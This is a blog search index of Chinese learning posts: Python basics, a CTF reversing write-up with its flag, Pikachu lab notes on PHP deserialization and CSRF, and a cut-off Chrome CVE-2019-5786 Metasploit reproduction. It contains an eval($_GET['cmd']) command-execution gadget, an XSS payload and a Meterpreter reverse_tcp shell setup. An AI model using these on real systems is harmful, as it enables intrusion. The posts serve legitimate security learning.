<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Python学习1</title>
    <link href="/2022/08/10/python%E5%AD%A6%E4%B9%A01/"/>
    <url>/2022/08/10/python%E5%AD%A6%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<h2 id="输出函数print"><a href="#输出函数print" class="headerlink" title="输出函数print()"></a>输出函数print()</h2><p>1.可输出数字、字符串、表达式</p><figure class="highlight plaintext"><figcaption><span>#520</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs print(520)">print('HelloWorld') #HelloWorld<br>print(3+1) #4<br></code></pre></td></tr></tbody></table></figure><p>2.将数据输出文件中 <code>file=fp</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fp">print('Hello',file=fp)<br>fp.close()<br></code></pre></td></tr></tbody></table></figure><blockquote><p><code>a+</code> 若文件不存在则创建，存在则在文件内容后追加，读写。</p></blockquote><p>3.不进行换行输出</p><p><code>print('Hello','world','python') #Hello world python</code></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><ol><li></li></ol><p><code>\n</code> - 换行；<code>\r</code> - 回车；<code>\t</code> - 水平制表符；<code>\b</code> - 退格；</p><figure class="highlight plaintext"><figcaption><span>#world #world将hello覆盖</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs print('hello\rworld')">print('hello\bworld') #hellworld #\b退格，将o退没了<br></code></pre></td></tr></tbody></table></figure><p>2.原字符，在字符串前加r或R，可使字符串内转义字符失效。</p><pre><code class="hljs">print(r'hello\nworld') #hello\nworld</code></pre><p>注意：字符串最后一个字符不可为斜杠。</p><h2 id="进制，字符编码，标识符，保留字"><a href="#进制，字符编码，标识符，保留字" class="headerlink" title="进制，字符编码，标识符，保留字"></a>进制，字符编码，标识符，保留字</h2><p>1Byte(字节)=8bit(位)</p><p>1KB(千字节)=1024Byte</p><p>1MB(兆字节)=1024KB</p><p>1GB(吉字节)=1024MB</p><p>1TB(太字节)=1024GB</p><p>标识符：字母、数字、下划线（不可以数字开头，严格区分大小写）</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>内存中一个带标签的空间</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs name">print('标识',id(name))<br>print('类型',type(name))<br>print('值',name)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><figcaption><span>1694477549296</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 标识">类型 &lt;class 'str'&gt;<br>值 Lihua<br></code></pre></td></tr></tbody></table></figure><p>多次赋值后，变量名会指向新的使用。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="int-整型"><a href="#int-整型" class="headerlink" title="int 整型"></a>int 整型</h3><ul><li>十进制 默认的进制0~9</li><li>二进制 以0b开头0,1</li><li>八进制 以0o开头0~7</li><li>十六禁止 以0x开头0<del>9，A</del>F</li></ul><h3 id="float-浮点型"><a href="#float-浮点型" class="headerlink" title="float 浮点型"></a>float 浮点型</h3><p>存储具有不精确性，可导入模块Decimal</p><figure class="highlight plaintext"><figcaption><span>decimal import Decimal</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs from">print(Decimal('1.1')+Decimal('2.2')) #3.3<br></code></pre></td></tr></tbody></table></figure><h3 id="str-字符串类型；bool-布尔类型"><a href="#str-字符串类型；bool-布尔类型" class="headerlink" title="str 字符串类型；bool 布尔类型"></a>str 字符串类型；bool 布尔类型</h3><p>字符串可用单引号、双引号、三引号或””” “””定义。</p><p>单引号双引号定义的字符串需要在一行；三引号可多行；</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs str">我用python'''<br>print(str)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 人生苦短，">我用python<br></code></pre></td></tr></tbody></table></figure><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><ul><li>str() 其他转字符串，也可以引号转</li><li>int() 其他转整形，文字和小数不能转，浮点数抹零取整</li><li>float() 其他转浮点，文字类不可转，整数转浮点末尾加.0</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs name">age=20<br>print('我叫'+name+'，今年'+str(age)+'岁')<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs a">b=98.9<br>c=False<br>print(type(a),type(b),type(c))<br>print(str(a),str(b),str(c),type(str(a)),type(str(b)),type(str(c)))<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><figcaption><span>'int'&gt; <class 'float'=""> <class 'bool'=""></class></class></span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs <class">10 98.9 False &lt;class 'str'&gt; &lt;class 'str'&gt; &lt;class 'str'&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs s1">f1=98.7<br>s2='76.77'<br>ff=True<br>s3='hello'<br>print(int(s1),type(int(s1))) #128<br>print(int(f1),type(int(f1))) #98<br> #print(int(s2),type(int(s2))) #Error<br>print(int(ff),type(int(ff))) #1<br> #print(int(s3),type(int(s3))) #Error<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><figcaption><span><class 'int'=""></class></span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 128">98 &lt;class 'int'&gt;<br>1 &lt;class 'int'&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>单行：#</p><p>多行：三引号</p><p>中文编码声明： <code>#coding:utf-8</code></p><h2 id="输入函数input"><a href="#输入函数input" class="headerlink" title="输入函数input()"></a>输入函数input()</h2><p>接收用户输入，返回类型str，存储’=’</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>1.算术运算符</p><p>加+  减-  乘*  除/  整除//  取余%  幂**</p><p>整除（一正一负向下取整）</p><p>取余（余数=被除数-除数*商）</p><p>2、赋值运算符 ‘=’</p><p>执行：从右至左；</p><p>+=、-=、*=、/=、//=、%=</p><pre><code class="hljs">a,b,c=10,20,30</code></pre><p><code>a+=30 # a=a+30</code></p><p>3.比较运算符 结果为bool</p><ul><li><blockquote><p>、&lt;、==、!=(不等于)、is、is not</p></blockquote></li><li>布尔：and,or,not,in,not in</li></ul><p>5.位运算符</p><p>与&amp; 11为1，否则为0</p><p>或| 00为0，否则为1</p><p>左移位&lt;&lt; 高位溢出舍弃，低位补0 （相当于乘2）</p><p>右移位&gt;&gt; 低位溢出舍弃，高位补0  （相当于除以2）</p><figure class="highlight plaintext"><figcaption><span># 0</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs print(4&amp;8)">print(4|8) # 12<br>print(4&lt;&lt;1) #8<br>print(4&gt;&gt;1) #2<br>print(4&lt;&lt;2) #16<br>print(4&gt;&gt;2) #1<br></code></pre></td></tr></tbody></table></figure><p>6.优先级</p><p>算术&gt;位&gt;比较&gt;布尔&gt;赋值</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SimpleRev</title>
    <link href="/2022/08/10/SimpleRev-buu-Re/"/>
    <url>/2022/08/10/SimpleRev-buu-Re/</url>
    
    <content type="html"><![CDATA[<p>IDA打开查看字符串，直接点进<code>Congratulation</code>找到关键函数<code>Decry()</code></p><p>浅分析一下</p><figure class="highlight plaintext"><figcaption><span>Decry()</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs __int64">{<br>  char *v0; <br>  char v2; <br>  int v3; <br>  signed int v4; <br>  signed int i; <br>  signed int v6; <br>  char src[8]; <br>  __int64 v8; <br>  int v9; <br>  __int64 v10; <br>  __int64 v11; <br>  int v12; <br>  __int64 v13; <br>  v13 = *MK_FP(__FS__, 40LL);<br>  *(_QWORD *)src = 'SLCDN';<br>  v8 = 0LL;<br>  v9 = 0;<br>  v10 = 'wodah';<br>  v11 = 0LL;<br>  v12 = 0;<br>  LODWORD(v0) = join(key3, &amp;v10); <br>// 小端序存储，v10要倒过来看：text=killshadow<br>  text = v0;<br>  strcpy(key, key1);  <br>  strcat(key, src);  // key=ADSFKNDCLS<br>  v3 = 0;<br>  v4 = 0;<br>  getchar();<br>  v6 = strlen(key);<br>// for循环是为了大写变小写<br>  for ( i = 0; i &lt; v6; ++i )<br>  {<br>    if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 )<br>      key[i] = key[v4 % v6] + 32;<br>    ++v4;<br>  }<br>  printf("Please input your flag:", src);<br>  while ( 1 )<br>  {<br>    v2 = getchar();<br>    if ( v2 == 10 )<br>      break;<br>    if ( v2 == 32 )<br>    {<br>      ++v3;<br>    }<br>    else<br>    {<br>      if ( v2 &lt;= 96 || v2 &gt; 122 )<br>      {<br>        if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 )<br>          str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97;<br>      }<br>      else<br>      {<br>        str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //核心代码<br>      }<br>      if ( !(v4 % v6) )<br>        putchar(32);<br>      ++v3;<br>    }<br>  }<br>//经过加密后str2与text一致得到Congratulation，则加密前的str2就是flag<br>  if ( !strcmp(text, str2) )<br>    puts("Congratulation!\n");<br>  else<br>    puts("Try again!\n");<br>  return *MK_FP(__FS__, 40LL) ^ v13;<br>}<br></code></pre></td></tr></tbody></table></figure><p>有取余，没法逆推，用爆破：</p><figure class="highlight processing"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs processing">py脚本：<br><span class="hljs-built_in">key</span>=<span class="hljs-string">"ADSFKNDCLS"</span><br><span class="hljs-built_in">text</span>=<span class="hljs-string">"killshadow"</span><br>s=<span class="hljs-string">""</span><br>flag=<span class="hljs-string">""</span><br><span class="hljs-built_in">loop</span>=<span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><br>v2 = <span class="hljs-number">0</span><br>v3 = <span class="hljs-number">0</span><br>v5 = <span class="hljs-title function_">len</span>(<span class="hljs-built_in">key</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,v5):<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &gt; <span class="hljs-number">64</span> and <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &lt;= <span class="hljs-number">90</span> ):<br>        s += <span class="hljs-title function_">chr</span>(<span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) + <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s +=<span class="hljs-built_in">key</span>[i]<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_">len</span>(<span class="hljs-built_in">text</span>)):<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-built_in">loop</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">text</span>[i])==(<span class="hljs-title function_">ord</span>(j)<span class="hljs-number">-39</span>-<span class="hljs-title function_">ord</span>(s[i])+<span class="hljs-number">97</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>:<br>            flag+=j<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C语言脚本"> #include&lt;stdio.h&gt; <br>int main()<br>{<br>char key[] = "adsfkndcls";<br>char text[] = "killshadow";<br>int i;<br>int v3=10;//长度 <br>for (int i = 0; i &lt; 10; i++)<br>{<br>for (int j = 0; j &lt; 128; j++)<br>{<br>if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a')<br>{<br>continue;<br>}<br>if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i])<br>{<br>printf("%c",j);<br>v3++;<br>break;<br>}<br>}<br>}<br>}<br></code></pre></td></tr></tbody></table></figure><pre><code class="hljs">flag{KLDQCUDFZO}</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>Re</tag>
      
      <tag>Buu</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化 serialize()"></a>序列化 serialize()</h2><p>序列化：把一个对象变成可以传输的字符串。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs <?php">class S{<br>public $test="pikachu";<br>}<br>$s=new S;//创建一个对象<br>serialize($s);//把这个对象进行序列化<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p>结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}</p><p>O:代表object</p><p>1:代表对象名字长度为一个字符</p><p>S:对象的名称</p><p>1:代表对象里面有一个变量</p><p>s:数据类型</p><p>4:变量名称的长度</p><p>test:变量名称</p><p>s:数据类型</p><p>7:变量值的长度</p><p>pikachu:变量值</p><p>（什么鬼，没懂）</p><h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><pre><code class="hljs">$u=unserialize("0:1:"S":1{s:4:"test":s:7:"pikachu";}");echo $u ‐&gt; test;//得到结果为pikachu</code></pre><p>序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p><p><img src="https://s2.loli.net/2022/08/09/LkvmjC2rTAON7Pi.png" alt="image.png"></p><ul><li>常见的魔法函数：<ul><li><em>__construct()</em> 当一个对象创建时被调用</li><li><em>__destruct()</em> 当一个对象销毁时被调用</li><li><em>__toString()</em> 当一个对象被当作一个字符串使用</li><li><em>__sleep()</em> 在对象在被序列化之前运行</li><li><em>__wakeuop</em> 将在序列化之后立即被调用</li></ul></li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs <?php">//定义类<br>class test<br>{<br>//在对象被销毁时候自动调用destruct函数<br>function __destruct()<br>{<br>echo "&lt;br&gt;__destruct()&lt;br&gt;";<br>//在此函数中添加eval()以达到命令执行的目的<br>eval($_GET['cmd']);<br>}<br>}<br>//echo serialize($test);方便将序列化后的test写进u参数中传参<br>$test = new test;<br>echo serialize($test);<br>//执行完这个echo后会被垃圾回收器回收，也就是销毁<br>unserialize($_GET['u']);<br>//反序列化执行完后又会被回收<br>// 所以会出现两次destruct<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/09/obFRtxqgIyXBO9k.png" alt="image.png"></p><p>传参: <code>http://localhost/phptest.php?O:4:"test":0:{}&amp;cmd=system("woami");</code></p><p>利用成功。</p><h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p><img src="https://s2.loli.net/2022/08/09/cl6J2puye5PkzTL.png" alt="image.png"></p><p>随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的”</p><p>提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。</p><p><img src="https://s2.loli.net/2022/08/09/F58nRZDKNG4VSXi.png" alt="image.png"></p><p>将XSS字符串 <code>&lt;script&gt;alert('xss')&lt;/script&gt; </code>序列化一下： <code>O:1:"S":1:{s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";}</code></p><p>提交，成功</p><p><img src="https://s2.loli.net/2022/08/09/TVb9AHiwgLo812t.png" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>pikachu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu-CSRF</title>
    <link href="/2022/08/09/pikachu-CSRF/"/>
    <url>/2022/08/09/pikachu-CSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h2 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h2><p>1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h2 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h2><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h2 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h2><p>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p><ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul><p>2.确认凭证的有效期</p><ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul><h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png" alt="image.png"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。</p><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。</p><p>正常登录状态：</p><p><img src="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png" alt="image.png"></p><p>点击恶意url后，用户信息直接被修改</p><p><img src="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png" alt="image.png"></p><h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h1><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png" alt="image.png"></p><h1 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h1><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pikachu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="/2022/08/09/CVE-2019-5786/"/>
    <url>/2022/08/09/CVE-2019-5786/</url>
    
    <content type="html"><![CDATA[<p>前言：</p><p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p><p>win7_x86</p><p>Google_chrome_(32bit)_v72.0.3626.119</p><p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p><pre><code class="hljs">root@kali:~# msfconsole -qmsf5 &gt; search chrome_filereader</code></pre><blockquote><p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p></blockquote><p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p><p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p><h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p><ul><li><p>readyState：表示读取状态</p><ul><li>empty,0,尚未读取</li><li>loading,1,正在读取</li><li>done,2,读取完成</li></ul></li><li><p>result：表示读取结果，具体格式与读取方式有关：</p><ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><p>onprogress：回调函数</p><ul><li>读取Blob触发</li><li>当数据较多时会周期性触发多次</li></ul></li><li><p>onloadend：回调函数</p><ul><li>读取操作完成时触发，不论读取成功或失败</li></ul></li></ul><p>查看模块信息</p><p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p><p>漏洞介绍：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Payload information:<br>Description:<br>  This exploit takes advantage <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> use <span class="hljs-keyword">after</span> free vulnerability <span class="hljs-keyword">in</span> <br>  Google Chrome <span class="hljs-number">72.0</span><span class="hljs-number">.3626</span><span class="hljs-number">.119</span> running <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span> <span class="hljs-title">x86</span>. <span class="hljs-title">The</span> <br>  FileReader.readAsArrayBuffer <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">can</span> <span class="hljs-title">return</span> <span class="hljs-title">multiple</span> <span class="hljs-title">references</span> </span><br>  <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same ArrayBuffer object, which can be freed <span class="hljs-keyword">and</span> overwritten <br>  <span class="hljs-keyword">with</span> sprayed objects. The dangling ArrayBuffer reference can be used <br>  <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> sprayed objects, allowing arbitrary memory access <span class="hljs-built_in">from</span> <br>  Javascript. This is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">and</span> execute shellcode <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <br>  WebAssembly object. The shellcode is executed <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> Chrome <br>  sandbox, so you must explicitly disable <span class="hljs-keyword">the</span> sandbox <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> payload <br>  <span class="hljs-built_in">to</span> be successful.<br></code></pre></td></tr></tbody></table></figure><p>选择payload</p><pre><code class="hljs">-&gt; set payload windows/meterpreter/reverse_tcp</code></pre><blockquote><p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p></blockquote><p>设置payload参数：LHOST为kali ip</p><pre><code class="hljs">-&gt; set LHOST 192.168.119.128</code></pre><p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p><p>创建服务 <code>-&gt; set payload 